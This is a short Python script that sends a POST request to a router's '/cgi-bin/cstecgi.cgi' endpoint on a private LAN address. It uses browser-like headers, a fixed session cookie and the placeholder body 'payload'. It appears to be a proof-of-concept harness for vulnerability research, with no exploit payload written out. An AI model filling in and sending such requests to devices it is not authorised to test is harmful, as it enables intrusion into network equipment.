import requests
import json
from urllib.parse import parse_qs

ip = "192.168.153.2"


def calculate_length(data):
    return len(data)


url = "http://" + ip + "/cgi-bin/cstecgi.cgi"
data = "payload"
headers = {
    "Host": ip,
    "Content-Length": f"{calculate_length(data)}",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": f"http://{ip}",
    "Referer": f"http://{ip}/basic/wan.html?time=1762851072993",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie": "SESSION_ID=2:1767967932:2",
    "Connection": "close",
}
try:
    res = requests.post(url=url, headers=headers, data=data, timeout=500, verify=False)
    print(res.status_code)
except requests.exceptions.Timeout:
    print("TIMEOUT")
except Exception as e:
    print("EXCEPTION:", str(e))